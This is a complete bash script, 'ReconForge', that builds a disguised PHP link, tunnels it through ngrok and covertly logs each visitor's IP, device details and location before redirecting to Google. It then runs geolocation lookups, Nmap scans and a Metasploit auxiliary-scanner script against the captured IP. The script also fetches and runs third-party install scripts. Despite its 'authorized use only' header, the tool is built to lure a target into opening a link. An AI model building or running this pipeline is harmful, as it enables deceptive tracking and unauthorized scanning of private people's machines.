#!/bin/bash
#====================================================================
# ReconForge v1.0
# Automated Pentest Pipeline: Link Gen → IP/OS Capture → IP-Tracer
# → Nmap Scan → Metasploit Integration
# 
# Authorized Security Assessment Use Only
#====================================================================

# ---- Color Codes ----
R='\e[1;31m'
G='\e[1;92m'
Y='\e[1;93m'
C='\e[1;96m'
W='\e[1;97m'
M='\e[1;95m'
B='\e[1;94m'
N='\e[0m'

# ---- Globals ----
TARGET_IP=""
CAPTURED_DIR="captured_data"
PHP_PORT=8080
TUNNEL_PORT=3333
PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ---- Trap Cleanup ----
trap 'printf "\n${R}[!] Interrupted. Cleaning up...${N}\n"; cleanup; exit 1' 2 3 6

cleanup() {
    printf "${Y}[*] Killing background processes...${N}\n"
    killall php 2>/dev/null
    killall ngrok 2>/dev/null
    killall cloudflared 2>/dev/null
    pkill -f "php -S" 2>/dev/null
    pkill -f "ngrok http" 2>/dev/null
    pkill -f "cloudflared tunnel" 2>/dev/null
    sleep 1
    printf "${G}[+] Cleanup complete.${N}\n"
}

# ====================================================================
# BANNER
# ====================================================================
banner() {
    clear
    printf "${R}  ██████  ███████  ██████  ██████  ███    ██ ███████  ██████  ██████  ██████  ███████ ${N}\n"
    printf "${R}  ██   ██ ██      ██      ██   ██ ████   ██ ██      ██      ██   ██ ██   ██ ██      ${N}\n"
    printf "${Y}  ██████  █████   ██      ██████  ██ ██  ██ █████   ██      ██████  ██████  █████   ${N}\n"
    printf "${Y}  ██   ██ ██      ██      ██   ██ ██  ██ ██ ██      ██      ██   ██ ██   ██ ██      ${N}\n"
    printf "${G}  ██   ██ ███████  ██████ ██   ██ ██   ████ ███████  ██████ ██   ██ ██   ██ ███████ ${N}\n"
    printf "${C}  ═════════════════════════════════════════════════════════════════════════════════${N}\n"
    printf "${M}       ReconForge v1.0 — Full Recon & Pentest Pipeline${N}\n"
    printf "${W}       IP Capture → OS Fingerprint → IP-Tracer → Nmap → Metasploit${N}\n"
    printf "${C}  ═════════════════════════════════════════════════════════════════════════════════${N}\n\n"
}

# ====================================================================
# DEPENDENCY CHECK
# ====================================================================
check_deps() {
    local deps=("php" "git" "wget" "curl" "nmap" "unzip")
    local missing=()
    
    printf "${Y}[*] Checking dependencies...${N}\n"
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done
    
    # Check msfconsole
    if ! command -v msfconsole &>/dev/null; then
        printf "${Y}[!] Metasploit (msfconsole) not found in PATH. Will attempt to locate.${N}\n"
    fi
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        printf "${R}[!] Missing dependencies: ${missing[*]}${N}\n"
        printf "${Y}[*] Install with: sudo apt install ${missing[*]}${N}\n"
        printf "${Y}[*] For Metasploit: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod +x msfinstall && sudo ./msfinstall${N}\n"
        exit 1
    fi
    printf "${G}[+] All core dependencies satisfied.${N}\n\n"
}

# ====================================================================
# CREATE PHP CAPTURE PAGE (grabs IP + User-Agent/OS info)
# ====================================================================
create_capture_page() {
    mkdir -p "$PROJECT_DIR/$CAPTURED_DIR"
    
    cat > "$PROJECT_DIR/index.php" << 'PHPEOF'
<?php
$log_file = "captured_data/victim_info.txt";
$timestamp = date("Y-m-d H:i:s");

// Collect victim data
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
$accept_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';

// OS Detection from User-Agent
$os = "Unknown";
$browser = "Unknown";
$ua = $user_agent;

if (preg_match('/Windows NT 10\.0/i', $ua)) $os = "Windows 10 / 11";
elseif (preg_match('/Windows NT 6\.3/i', $ua)) $os = "Windows 8.1";
elseif (preg_match('/Windows NT 6\.2/i', $ua)) $os = "Windows 8";
elseif (preg_match('/Windows NT 6\.1/i', $ua)) $os = "Windows 7";
elseif (preg_match('/Windows NT 6\.0/i', $ua)) $os = "Windows Vista";
elseif (preg_match('/Windows NT 5\.1/i', $ua)) $os = "Windows XP";
elseif (preg_match('/Windows Phone/i', $ua)) $os = "Windows Phone";
elseif (preg_match('/Android/i', $ua)) {
    if (preg_match('/Android (\d+\.\d+)/i', $ua, $m)) $os = "Android " . $m[1];
    else $os = "Android";
} elseif (preg_match('/iPhone|iPad|iPod/i', $ua)) {
    if (preg_match('/OS (\d+)_(\d+)/i', $ua, $m)) $os = "iOS " . $m[1] . "." . $m[2];
    else $os = "iOS";
} elseif (preg_match('/Mac OS X (\d+)[._](\d+)/i', $ua, $m)) $os = "macOS " . $m[1] . "." . $m[2];
elseif (preg_match('/Linux/i', $ua)) $os = "Linux";
elseif (preg_match('/CrOS/i', $ua)) $os = "Chrome OS";

if (preg_match('/Chrome\/(\d+\.\d+)/i', $ua, $m)) $browser = "Chrome " . $m[1];
elseif (preg_match('/Firefox\/(\d+\.\d+)/i', $ua, $m)) $browser = "Firefox " . $m[1];
elseif (preg_match('/Safari\/(\d+\.\d+)/i', $ua, $m) && !preg_match('/Chrome/i', $ua)) $browser = "Safari " . $m[1];
elseif (preg_match('/Edge\/(\d+\.\d+)/i', $ua, $m)) $browser = "Edge " . $m[1];
elseif (preg_match('/MSIE (\d+\.\d+)/i', $ua, $m)) $browser = "IE " . $m[1];

// Device type
$device = "Desktop";
if (preg_match('/Mobile|Android|iPhone|iPad|iPod/i', $ua)) $device = "Mobile/Tablet";

// Get public IP info from ip-api.com
$ip_info = @file_get_contents("http://ip-api.com/json/" . $ip);
$ip_data = json_decode($ip_info, true);

$isp = $ip_data['isp'] ?? 'N/A';
$country = $ip_data['country'] ?? 'N/A';
$region = $ip_data['regionName'] ?? 'N/A';
$city = $ip_data['city'] ?? 'N/A';
$lat = $ip_data['lat'] ?? 'N/A';
$lon = $ip_data['lon'] ?? 'N/A';

// Build the log entry
$entry = "========================================\n";
$entry .= " Timestamp    : $timestamp\n";
$entry .= "----------------------------------------\n";
$entry .= " IP Address   : $ip\n";
$entry .= " OS           : $os\n";
$entry .= " Browser      : $browser\n";
$entry .= " Device       : $device\n";
$entry .= " User-Agent   : $user_agent\n";
$entry .= " Referer      : $referer\n";
$entry .= " Language     : $accept_lang\n";
$entry .= "----------------------------------------\n";
$entry .= " ISP          : $isp\n";
$entry .= " Country      : $country\n";
$entry .= " Region       : $region\n";
$entry .= " City         : $city\n";
$entry .= " Coordinates  : $lat, $lon\n";
$entry .= "========================================\n\n";

file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
file_put_contents("ip.txt", "IP: $ip\n", LOCK_EX);
file_put_contents("os.txt", "OS: $os\n", LOCK_EX);
file_put_contents("full_dump.txt", $entry, LOCK_EX);

// Redirect to a benign page after capture
header("Location: https://www.google.com");
exit;
PHPEOF

    printf "${G}[+] PHP capture page created at index.php${N}\n"
}

# ====================================================================
# START PHP + TUNNEL (Ngrok)
# ====================================================================
start_tunnel() {
    # ---- Ngrok Setup ----
    if [[ ! -f "$PROJECT_DIR/ngrok" && ! -f "$PROJECT_DIR/ngrok.exe" ]]; then
        printf "${Y}[*] Downloading Ngrok...${N}\n"
        arch=$(uname -m)
        if [[ "$(uname -s)" == "Linux" ]]; then
            case "$arch" in
                x86_64)  wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip ;;
                aarch64|arm64) wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip ;;
                *)        wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip ;;
            esac
        elif [[ "$(uname -s)" == "Darwin" ]]; then
            [[ "$arch" == "arm64" ]] && wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip \
                                     || wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip
        fi
        unzip -q ngrok.zip && chmod +x ngrok && rm -f ngrok.zip
    fi

    # Ngrok authtoken
    if [[ ! -f ~/.ngrok2/ngrok.yml ]]; then
        printf "${Y}[?] Enter your Ngrok authtoken (get it from https://dashboard.ngrok.com):${N}\n"
        read -r -p "  > " ngrok_token
        [[ -n "$ngrok_token" ]] && ./ngrok authtoken "$ngrok_token" &>/dev/null
    fi

    # Start PHP server
    printf "${Y}[*] Starting PHP server on port $PHP_PORT...${N}\n"
    cd "$PROJECT_DIR" && php -S 0.0.0.0:$PHP_PORT &>/dev/null &
    PHP_PID=$!
    sleep 2

    # Start Ngrok tunnel
    printf "${Y}[*] Starting Ngrok tunnel (port $PHP_PORT → public)...${N}\n"
    ./ngrok http $PHP_PORT --log=stdout &>.ngrok_output &
    NGROK_PID=$!
    sleep 8

    # Extract public URL
    LINK=""
    for i in {1..10}; do
        LINK=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -oP 'https://[^"]*\.ngrok-free\.app' | head -1)
        [[ -n "$LINK" ]] && break
        sleep 2
    done

    if [[ -z "$LINK" ]]; then
        printf "${R}[!] Failed to get Ngrok URL. Check internet or authtoken.${N}\n"
        cleanup
        exit 1
    fi

    printf "\n${G}╔══════════════════════════════════════════════════════════╗${N}\n"
    printf "${G}║  ${W}PUBLIC LINK READY — Send this to the target:${N}\n"
    printf "${G}║${N}\n"
    printf "${G}║  ${C}$LINK${N}\n"
    printf "${G}║${N}\n"
    printf "${G}║  ${Y}Waiting for target to open the link...${N}\n"
    printf "${G}╚══════════════════════════════════════════════════════════╝${N}\n"
    
    echo "$LINK" > "$PROJECT_DIR/$CAPTURED_DIR/public_link.txt"
}

# ====================================================================
# WAIT FOR VICTIM DATA
# ====================================================================
wait_for_target() {
    printf "\n${Y}[*] Listening for target... (Press Ctrl+C to skip wait)${N}\n"
    
    # Clear old data
    rm -f "$PROJECT_DIR/ip.txt" "$PROJECT_DIR/os.txt" "$PROJECT_DIR/full_dump.txt"
    
    # Poll for data
    while true; do
        if [[ -f "$PROJECT_DIR/ip.txt" ]]; then
            TARGET_IP=$(grep -oP 'IP:\s*\K.*' "$PROJECT_DIR/ip.txt" | head -1 | tr -d '[:space:]')
            
            printf "\n${G}[+] ${W}TARGET DATA CAPTURED!${N}\n"
            printf "${G}────────────────────────────────────────────${N}\n"
            
            if [[ -f "$PROJECT_DIR/full_dump.txt" ]]; then
                cat "$PROJECT_DIR/full_dump.txt"
            fi
            
            # OS info
            if [[ -f "$PROJECT_DIR/os.txt" ]]; then
                OS_INFO=$(grep -oP 'OS:\s*\K.*' "$PROJECT_DIR/os.txt" | head -1)
                printf "${Y}[+] OS Info:${N} ${W}$OS_INFO${N}\n"
            fi
            
            printf "${G}────────────────────────────────────────────${N}\n"
            printf "${G}[+] Target IP: ${W}$TARGET_IP${N}\n\n"
            
            # Save IP to file
            echo "$TARGET_IP" > "$PROJECT_DIR/$CAPTURED_DIR/target_ip.txt"
            break
        fi
        sleep 1
    done
}

# ====================================================================
# IP-TRACER: Clone & run
# ====================================================================
run_ip_tracer() {
    printf "\n${M}════════════════════════════════════════════════${N}\n"
    printf "${M}  PHASE 2: IP-TRACER — Geolocation & ISP Recon${N}\n"
    printf "${M}════════════════════════════════════════════════${N}\n\n"
    
    IP_TRACER_DIR="$PROJECT_DIR/ip_tracer_tool"
    
    # Try user-specified repo first, fallback to rajkumardusad
    if [[ ! -d "$IP_TRACER_DIR" ]]; then
        printf "${Y}[*] Cloning IP-Tracer from github.com/Zeeshan-78/Ip-tracer...${N}\n"
        git clone --depth 1 "https://github.com/Zeeshan-78/Ip-tracer.git" "$IP_TRACER_DIR" 2>/dev/null
        
        if [[ $? -ne 0 || ! -d "$IP_TRACER_DIR" ]]; then
            printf "${Y}[!] Zeeshan-78/Ip-tracer not found. Trying rajkumardusad/IP-Tracer...${N}\n"
            git clone --depth 1 "https://github.com/rajkumardusad/IP-Tracer.git" "$IP_TRACER_DIR" 2>/dev/null
        fi
        
        if [[ $? -eq 0 && -d "$IP_TRACER_DIR" ]]; then
            cd "$IP_TRACER_DIR"
            chmod +x install 2>/dev/null
            chmod +x ip-tracer 2>/dev/null
            chmod +x trace 2>/dev/null
            # Install if install script exists
            if [[ -f install ]]; then
                printf "${Y}[*] Installing IP-Tracer...${N}\n"
                bash install &>/dev/null
            fi
            cd "$PROJECT_DIR"
        else
            printf "${Y}[!] Git clone failed. Using direct API fallback.${N}\n"
            rm -rf "$IP_TRACER_DIR"
        fi
    fi
    
    # Run IP-Tracer on the target IP
    if [[ -n "$TARGET_IP" ]]; then
        printf "${Y}[*] Running IP-Tracer on target: ${W}$TARGET_IP${N}\n\n"
        
        # Try all possible invocation methods
        TRACER_RESULT=""
        
        if command -v trace &>/dev/null; then
            TRACER_RESULT=$(trace -t "$TARGET_IP" 2>&1)
        elif [[ -f "$IP_TRACER_DIR/trace" ]]; then
            TRACER_RESULT=$(bash "$IP_TRACER_DIR/trace" -t "$TARGET_IP" 2>&1)
        elif [[ -f "$IP_TRACER_DIR/ip-tracer" ]]; then
            TRACER_RESULT=$(bash "$IP_TRACER_DIR/ip-tracer" -t "$TARGET_IP" 2>&1)
        fi
        
        if [[ -n "$TRACER_RESULT" ]]; then
            echo "$TRACER_RESULT" > "$PROJECT_DIR/$CAPTURED_DIR/ip_tracer_result.txt"
            printf "${C}$TRACER_RESULT${N}\n"
        fi
        
        # Always run direct API call as fallback/enhancement
        printf "\n${Y}[*] Direct ip-api.com lookup as enhancement:${N}\n"
        curl -s "http://ip-api.com/json/$TARGET_IP" | python3 -m json.tool 2>/dev/null || curl -s "http://ip-api.com/json/$TARGET_IP" 2>/dev/null | tee -a "$PROJECT_DIR/$CAPTURED_DIR/ip_api_dump.json"
        printf "\n"
        
        # Also get whois info
        if command -v whois &>/dev/null; then
            printf "${Y}[*] Whois lookup:${N}\n"
            whois "$TARGET_IP" 2>/dev/null | head -40 | tee "$PROJECT_DIR/$CAPTURED_DIR/whois_info.txt"
            printf "\n"
        else
            printf "${Y}[!] whois not installed. Skipping.${N}\n"
        fi
    else
        printf "${R}[!] No target IP available. Skipping IP-Tracer.${N}\n"
    fi
    
    printf "\n${G}[+] IP-Tracer phase complete.${N}\n"
}

# ====================================================================
# NMAP SCAN
# ====================================================================
nmap_scan() {
    printf "\n${M}════════════════════════════════════════════════${N}\n"
    printf "${M}  PHASE 3: NMAP — Port & Service Enumeration${N}\n"
    printf "${M}════════════════════════════════════════════════${N}\n\n"
    
    if [[ -z "$TARGET_IP" ]]; then
        printf "${R}[!] No target IP to scan.${N}\n"
        return
    fi
    
    printf "${Y}[*] Target: $TARGET_IP${N}\n"
    printf "${Y}[*] Choose Nmap scan profile:${N}\n"
    printf "  ${W}[1]${N} Quick scan (top 100 ports)\n"
    printf "  ${W}[2]${N} Full scan (1-65535, slow)\n"
    printf "  ${W}[3]${N} Service/version detection + default scripts\n"
    printf "  ${W}[4]${N} Aggressive (OS detection + version + scripts + traceroute)\n"
    printf "  ${W}[5]${N} Custom Nmap arguments\n"
    printf "  ${W}[6]${N} Quick scan + service version (recommended)\n"
    read -r -p "${G}[>]${N} Choose [default: 6]: " nmap_choice
    nmap_choice=${nmap_choice:-6}
    
    # Confirm before scanning
    printf "\n${Y}[!] About to scan ${W}$TARGET_IP${Y}. This will send packets to the target.${N}\n"
    read -r -p "${G}[>]${N} Proceed? [Y/n]: " confirm
    confirm=${confirm:-Y}
    [[ ! "$confirm" =~ ^[Yy] ]] && { printf "${Y}[*] Skipping Nmap scan.${N}\n"; return; }
    
    case $nmap_choice in
        1) NMAP_CMD="nmap -T4 --top-ports 100 -oN $PROJECT_DIR/$CAPTURED_DIR/nmap_quick.txt $TARGET_IP" ;;
        2) NMAP_CMD="nmap -T4 -p- -oN $PROJECT_DIR/$CAPTURED_DIR/nmap_full.txt $TARGET_IP" ;;
        3) NMAP_CMD="nmap -T4 -sV -sC -oN $PROJECT_DIR/$CAPTURED_DIR/nmap_service.txt $TARGET_IP" ;;
        4) NMAP_CMD="nmap -T4 -A -oN $PROJECT_DIR/$CAPTURED_DIR/nmap_aggressive.txt $TARGET_IP" ;;
        5) read -r -p "${G}[>]${N} Enter custom Nmap args: " custom_args
           NMAP_CMD="nmap $custom_args -oN $PROJECT_DIR/$CAPTURED_DIR/nmap_custom.txt $TARGET_IP" ;;
        6|*) NMAP_CMD="nmap -T4 -sV --top-ports 1000 -oN $PROJECT_DIR/$CAPTURED_DIR/nmap_quick_services.txt $TARGET_IP" ;;
    esac
    
    printf "\n${Y}[*] Running:${N} $NMAP_CMD\n\n"
    
    # Execute with progress display
    eval "$NMAP_CMD" &
    NMAP_PID=$!
    
    # Spinner while scanning
    spin="/-\|"
    while kill -0 $NMAP_PID 2>/dev/null; do
        for i in $(seq 0 3); do
            printf "\r${C}[%c]${N} Scanning..." "${spin:$i:1}"
            sleep 0.3
        done
    done
    printf "\r${G}[+] Scan complete!          ${N}\n"
    
    # Show results summary
    local outfile=$(ls -t $PROJECT_DIR/$CAPTURED_DIR/nmap_*.txt 2>/dev/null | head -1)
    if [[ -n "$outfile" && -s "$outfile" ]]; then
        printf "\n${Y}[*] Open ports summary:${N}\n"
        grep -E "^[0-9]+/tcp|^[0-9]+/udp" "$outfile" | head -30
        printf "\n${G}[+] Full results saved to:${N} $outfile\n"
    fi
}

# ====================================================================
# METASPLOIT INTEGRATION
# ====================================================================
metasploit_integration() {
    printf "\n${M}════════════════════════════════════════════════${N}\n"
    printf "${M}  PHASE 4: METASPLOIT — Exploitation Framework${N}\n"
    printf "${M}════════════════════════════════════════════════${N}\n\n"
    
    # Locate msfconsole
    MSF_PATH=""
    for p in msfconsole /usr/bin/msfconsole /opt/metasploit-framework/bin/msfconsole /opt/metasploit/bin/msfconsole /usr/share/metasploit-framework/msfconsole; do
        command -v "$p" &>/dev/null && { MSF_PATH="$p"; break; }
    done
    
    if [[ -z "$MSF_PATH" ]]; then
        printf "${R}[!] Metasploit (msfconsole) not found.${N}\n"
        printf "${Y}[*] Install with: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod +x msfinstall && sudo ./msfinstall${N}\n"
        read -r -p "${G}[>]${N} Continue without Metasploit? [Y/n]: " skip_msf
        [[ "$skip_msf" =~ ^[Nn] ]] && return
        return
    fi
    
    printf "${G}[+] Metasploit found at: $MSF_PATH${N}\n"
    
    # Collect Nmap results for Metasploit import
    local nmap_xml=$(ls $PROJECT_DIR/$CAPTURED_DIR/nmap_*.xml 2>/dev/null | head -1)
    if [[ -z "$nmap_xml" ]]; then
        # Convert text output to XML if possible
        local nmap_txt=$(ls -t $PROJECT_DIR/$CAPTURED_DIR/nmap_*.txt 2>/dev/null | head -1)
        if [[ -n "$nmap_txt" ]]; then
            printf "${Y}[*] Converting Nmap text output to XML format...${N}\n"
            nmap_xml="$PROJECT_DIR/$CAPTURED_DIR/nmap_for_msf.xml"
            # Re-run with -oX for Metasploit import if we have the IP
            if [[ -n "$TARGET_IP" ]]; then
                printf "${Y}[*] Running Nmap with -oX for Metasploit compatibility...${N}\n"
                nmap -T4 -sV --top-ports 500 -oX "$nmap_xml" "$TARGET_IP" &>/dev/null &
                NMAP_PID=$!
                spin="/-\|"
                while kill -0 $NMAP_PID 2>/dev/null; do
                    for i in $(seq 0 3); do
                        printf "\r${C}[%c]${N} Generating XML scan..." "${spin:$i:1}"
                        sleep 0.3
                    done
                done
                printf "\r${G}[+] XML scan generated.${N}          \n"
            fi
        fi
    fi
    
    # Generate Metasploit RC script
    local RC_FILE="$PROJECT_DIR/$CAPTURED_DIR/msf_auto.rc"
    cat > "$RC_FILE" << EOF
# ReconForge Auto Metasploit Resource Script
# Generated for target: ${TARGET_IP:-UNKNOWN}
# Time: $(date)

spool $PROJECT_DIR/$CAPTURED_DIR/metasploit_output.txt
EOF

    # Add DB and import if XML exists
    if [[ -s "$nmap_xml" ]]; then
        cat >> "$RC_FILE" << EOF
db_status
db_import $nmap_xml
workspace -a reconforge_$(date +%Y%m%d)
hosts
services
vulns
EOF
    fi
    
    # If we have a target IP, add basic recon
    if [[ -n "$TARGET_IP" ]]; then
        cat >> "$RC_FILE" << EOF

# === RECONNAISSANCE ===
echo [*] Target IP: $TARGET_IP
echo [*] Running auxiliary scanners...

# TCP port scanner (quick)
use auxiliary/scanner/portscan/tcp
set RHOSTS $TARGET_IP
set PORTS 21,22,23,25,53,80,110,139,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,8080,8443
set THREADS 20
run

# HTTP/HTTPS service detection
use auxiliary/scanner/http/http_version
set RHOSTS $TARGET_IP
run

# SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS $TARGET_IP
run

# SSH version
use auxiliary/scanner/ssh/ssh_version
set RHOSTS $TARGET_IP
run

# FTP anonymous access check
use auxiliary/scanner/ftp/ftp_version
set RHOSTS $TARGET_IP
run

echo [*] Recon complete. Review results with 'hosts' and 'services'.
EOF
    fi
    
    # Interactive section
    cat >> "$RC_FILE" << 'EOF'

echo [*] Entering interactive mode. Use 'exit' to quit msfconsole.
echo [*] Available commands: hosts, services, vulns, search, use <module>, etc.
EOF
    
    printf "${Y}[*] Metasploit resource script created:${N} $RC_FILE\n"
    printf "\n${Y}Choose Metasploit launch mode:${N}\n"
    printf "  ${W}[1]${N} Launch with auto-recon resource script (recommended)\n"
    printf "  ${W}[2]${N} Launch interactive console only (manual control)\n"
    printf "  ${W}[3]${N} Skip Metasploit\n"
    read -r -p "${G}[>]${N} Choose [default: 1]: " msf_mode
    msf_mode=${msf_mode:-1}
    
    case $msf_mode in
        1)
            printf "\n${Y}[*] Launching Metasploit with auto-recon script...${N}\n"
            printf "${Y}[*] Resource file: $RC_FILE${N}\n"
            printf "${C}══════════════════════════════════════════════════════════${N}\n"
            printf "${C}  Metasploit is starting. The auto-recon will run first,${N}\n"
            printf "${C}  then drop you into an interactive shell.${N}\n"
            printf "${C}  Type 'exit' when done.${N}\n"
            printf "${C}══════════════════════════════════════════════════════════${N}\n\n"
            sleep 2
            "$MSF_PATH" -q -r "$RC_FILE"
            ;;
        2)
            printf "\n${Y}[*] Launching interactive Metasploit console...${N}\n"
            printf "${Y}[*] Type 'exit' to quit.${N}\n\n"
            sleep 1
            "$MSF_PATH" -q
            ;;
        3|*)
            printf "${Y}[*] Skipping Metasploit.${N}\n"
            ;;
    esac
}

# ====================================================================
# SUMMARY REPORT
# ====================================================================
summary_report() {
    printf "\n${M}════════════════════════════════════════════════${N}\n"
    printf "${M}  FINAL SUMMARY${N}\n"
    printf "${M}════════════════════════════════════════════════${N}\n\n"
    
    printf "${G}[+] Target IP:${N} ${W}${TARGET_IP:-N/A}${N}\n"
    printf "${G}[+] All captured data saved in:${N} ${W}$PROJECT_DIR/$CAPTURED_DIR/${N}\n"
    printf "\n"
    printf "${Y}Files generated:${N}\n"
    ls -1 "$PROJECT_DIR/$CAPTURED_DIR/" 2>/dev/null | sed 's/^/  • /'
    
    printf "\n${G}════════════════════════════════════════════════${N}\n"
    printf "${G}  RECONFORGE COMPLETE${N}\n"
    printf "${G}════════════════════════════════════════════════${N}\n\n"
}

# ====================================================================
# INSTALL IP-TRACER SEPARATELY OPTION
# ====================================================================
install_ip_tracer() {
    printf "\n${Y}[*] Installing IP-Tracer system-wide...${N}\n"
    local dir="$PROJECT_DIR/ip_tracer_system"
    git clone --depth 1 "https://github.com/Zeeshan-78/Ip-tracer.git" "$dir" 2>/dev/null ||
    git clone --depth 1 "https://github.com/rajkumardusad/IP-Tracer.git" "$dir" 2>/dev/null
    
    if [[ -d "$dir" ]]; then
        cd "$dir"
        chmod +x install 2>/dev/null
        chmod +x *.sh 2>/dev/null
        bash install 2>/dev/null && printf "${G}[+] IP-Tracer installed successfully!${N}\n" \
            || printf "${Y}[!] Install script failed. Files available at $dir${N}\n"
        cd "$PROJECT_DIR"
    else
        printf "${R}[!] Failed to download IP-Tracer.${N}\n"
    fi
}

# ====================================================================
# MAIN MENU
# ====================================================================
main_menu() {
    banner
    printf "${W}Select operation mode:${N}\n"
    printf "  ${C}[1]${N} ${W}Full Pipeline${N} — Link Gen → Wait → IP-Tracer → Nmap → Metasploit\n"
    printf "  ${C}[2]${N} ${W}Quick Recon${N} — Link Gen → Wait → Nmap Quick Scan → Summary\n"
    printf "  ${C}[3]${N} ${W}IP-Tracer Only${N} — Enter an IP manually and trace/scan it\n"
    printf "  ${C}[4]${N} ${W}Nmap Only${N} — Scan a target IP with Nmap\n"
    printf "  ${C}[5]${N} ${W}Metasploit Only${N} — Launch Metasploit console\n"
    printf "  ${C}[6]${N} ${W}Install IP-Tracer${N} — Download and install IP-Tracer tool\n"
    printf "  ${C}[7]${N} ${W}Exit${N}\n"
    read -r -p "${G}[>]${N} Choose [default: 1]: " mode
    mode=${mode:-1}
    
    case $mode in
        1)  # Full Pipeline
            check_deps
            create_capture_page
            start_tunnel
            wait_for_target
            run_ip_tracer
            nmap_scan
            metasploit_integration
            summary_report
            cleanup
            ;;
        2)  # Quick Recon
            check_deps
            create_capture_page
            start_tunnel
            wait_for_target
            run_ip_tracer
            nmap_scan
            summary_report
            cleanup
            ;;
        3)  # IP-Tracer Only
            read -r -p "${G}[>]${N} Enter target IP address: " TARGET_IP
            if [[ -z "$TARGET_IP" ]]; then
                printf "${R}[!] No IP provided.${N}\n"
                exit 1
            fi
            echo "$TARGET_IP" > "$PROJECT_DIR/$CAPTURED_DIR/target_ip.txt"
            run_ip_tracer
            nmap_scan
            summary_report
            ;;
        4)  # Nmap Only
            read -r -p "${G}[>]${N} Enter target IP/domain: " TARGET_IP
            [[ -z "$TARGET_IP" ]] && { printf "${R}[!] No target.${N}\n"; exit 1; }
            echo "$TARGET_IP" > "$PROJECT_DIR/$CAPTURED_DIR/target_ip.txt"
            nmap_scan
            summary_report
            ;;
        5)  # Metasploit Only
            metasploit_integration
            ;;
        6)  # Install IP-Tracer
            install_ip_tracer
            ;;
        7|*) exit 0 ;;
    esac
}

# ====================================================================
# ENTRY POINT
# ====================================================================
mkdir -p "$PROJECT_DIR/$CAPTURED_DIR"
main_menu
